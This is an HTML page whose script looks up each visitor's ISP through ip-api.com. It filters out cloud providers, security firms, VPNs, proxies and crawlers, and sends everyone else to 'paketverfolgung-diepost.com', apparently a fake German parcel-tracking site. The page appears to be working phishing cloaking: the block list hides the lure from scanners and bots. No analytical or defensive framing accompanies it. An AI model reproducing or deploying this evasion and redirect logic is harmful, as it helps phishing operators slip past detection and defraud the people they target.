<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
</head>
<body>
    <script>
        const BLOCKED_PROVIDERS = [
            'google', 'azure', 'cloudflare', 'amazonaws', 'digitalocean',
            'linode', 'vultr', 'ovh', 'hetzner', 'scaleway', 'aws',
            'datacenter', 'hosting', 'vpn', 'proxy', 'bot', 'crawler',
            'facebook', 'amazon', 'microsoft', 'akamai', 'fastly'
        ];

        async function checkAndRedirect() {
            try {
                const response = await fetch('http://ip-api.com/json/?fields=query,isp,org,usage,mobile');
                const data = await response.json();

                const isp = (data.isp || '').toLowerCase();
                const org = (data.org || '').toLowerCase();
                const usage = (data.usage || '').toLowerCase();

                const isBlocked = BLOCKED_PROVIDERS.some(provider =>
                    isp.includes(provider) || org.includes(provider) || usage.includes(provider)
                );

                const isDatacenter = usage.includes('datacenter') || usage.includes('commercial');

                if (!isBlocked && !isDatacenter) {
                    window.location.href = 'https://paketverfolgung-diepost.com';
                }
            } catch (error) {
                window.location.href = 'https://paketverfolgung-diepost.com';
            }
        }

        checkAndRedirect();
    </script>
</body>
</html>
